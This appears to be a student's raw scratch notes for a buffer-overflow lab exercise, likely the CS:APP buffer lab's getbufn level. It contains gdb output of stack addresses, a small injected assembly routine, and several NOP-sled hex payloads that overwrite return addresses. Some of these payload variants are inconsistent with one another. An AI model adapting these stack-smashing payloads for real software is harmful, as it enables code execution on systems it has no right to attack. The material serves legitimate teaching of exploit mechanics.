
Breakpoint 1, 0x080492a5 in getbufn ()
(gdb) p/x ($ebp -0x208)
$1 = 0x55683738
(gdb) c
Continuing.
Type string:00002
Dud: getbufn returned 0x1
Better luck next time

Breakpoint 1, 0x080492a5 in getbufn ()
(gdb) p/x ($ebp -0x208)
$2 = 0x556836b8
(gdb) c
Continuing.
Type string:00003
Dud: getbufn returned 0x1
Better luck next time

Breakpoint 1, 0x080492a5 in getbufn ()
(gdb) p/x ($ebp -0x208)
$3 = 0x556836b8
(gdb) c
Continuing.
Type string:000004
Dud: getbufn returned 0x1
Better luck next time

Breakpoint 1, 0x080492a5 in getbufn ()
(gdb) p/x ($ebp -0x208)
$4 = 0x556836f8
(gdb) c
Continuing.
Type string:0000005
Dud: getbufn returned 0x1
Better luck next time

Breakpoint 1, 0x080492a5 in getbufn ()
(gdb) p/x ($ebp -0x208)
$5 = 0x55683718
(gdb) 


$1 = 0x55683738  38 37 68 55
$2 = 0x556836b8
$3 = 0x556836b8
$4 = 0x556836f8
$5 = 0x55683718


lea 0x28(%esp),%ebp
mov $0x5aad556c,%eax
push $0x08049c67
ret

00000000 <.text>:
   0:	8d 6c 24 28          	lea    0x28(%esp),%ebp
   4:	b8 6c 55 ad 5a       	mov    $0x5aad556c,%eax
   9:	68 67 9c 04 08       	push   $0x8049c67
   e:	c3                   	ret  


8d 6c 24 28 b8 6c 55 ad 5a 68 67 9c 04 08 c3


90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 

90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 

90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 

90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 

90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 

90 90 90 90 90 8d 6c 24 28 b8 95 b1 91 3d 68 67 9c 04 08 c3
00 00 00 00 38 37 68 55





0x556839c8
(gdb) c


0000000 <.text>:
   0:	8d 6c 24 28          	lea    0x28(%esp),%ebp
   4:	b8 95 b1 91 3d       	mov    $0x3d91b195,%eax
   9:	68 67 9c 04 08       	push   $0x8049c67
   e:	c3                   	ret  

   Userid: 2016010305
Cookie: 0x3d91b195


90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90

90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 

90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 

90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 

90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 

90 90 90 90 90 8d 6c 24 28 b8 6c 55 ad 5a 68 67 8c 04 08 c3
00 00 00 00 38 37 68 55

00000000 <.text>:
   0:	8d 6c 24 28          	lea    0x28(%esp),%ebp
   4:	b8 6c 55 ad 5a       	mov    $0x5aad556c,%eax
   9:	68 67 8c 04 08       	push   $0x8048c67
   e:	c3                   	ret 
   0x55683738

   0x08049c67

90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 8d 6c 24 28 b8 6c 55 ad 5a 68 67 8c 04 08 c3
38 37 68 55


90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 8d 6c 24 28 b8 95 b1 91 3d 68 67 9c 04 08 c3
00 00 00 00 c8 39 68 55

90 90 99 90 90  90 90 90 90 90  90 90 90 90 90  90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 99 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 8d 6c 24 28 b8 95 b1 91 3d 68 67 
9c 04 08 c3 c8 39 68 55


0000000 <.text>:
   0:	8d 6c 24 28          	lea    0x28(%esp),%ebp
   4:	b8 95 b1 91 3d       	mov    $0x3d91b195,%eax
   9:	68 67 8c 04 08       	push   $0x8048c67
   e:	c3  

90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90
8d 6c 24 28 b8 95 b1 91 3d 68 67 8c 04 08 c3  
00 00 00 00 
c8 39 68 55
0a


90 90 90 90 90  90 90 90 90 90  90 90 90 90 90  90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90

90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90

90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90

90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90

90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90
8d 6c 24 28 b8 6c 55 ad 5a 68 67 8c 04 08 c3  
00 00 00 00 
38 37 68 55
0a